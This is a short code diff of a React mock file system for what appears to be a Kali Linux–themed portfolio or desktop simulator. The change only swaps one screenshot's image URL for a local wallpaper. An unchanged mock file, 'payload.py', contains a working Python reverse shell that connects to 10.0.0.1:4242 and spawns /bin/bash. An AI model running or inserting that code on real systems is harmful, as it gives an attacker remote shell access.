@@ -95,7 +95,7 @@ const MOCK_FS = {
     "payload.py": { type: 'text', content: "import socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(('10.0.0.1',4242))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn('/bin/bash')", icon: <FileCode size={48} className="text-emerald-400" /> },
     "kali_wallpaper.jpg": { type: 'image', url: './images/wallpapers/wall-1.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
     "background.jpg": { type: 'image', url: './images/wallpapers/wall-8.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
-    "sc_kali_1.png": { type: 'image', url: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc48?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-purple-400" /> },
+    "sc_kali_1.png": { type: 'image', url: './images/wallpapers/wall-1.webp', icon: <ImageIcon size={48} className="text-purple-400" /> },
     "sc_kali_2.png": { type: 'image', url: 'https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&q=80&w=1200', icon: <ImageIcon size={48} className="text-purple-400" /> },
     "Report_2025.pdf": { type: 'pdf', url: './images/me/finnal CSDA quiz 1.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
     "Network_Topology.pdf": { type: 'pdf', url: './images/me/Introduction to Linux and its shell.pdf', icon: <FileDigit size={48} className="text-red-400" /> },
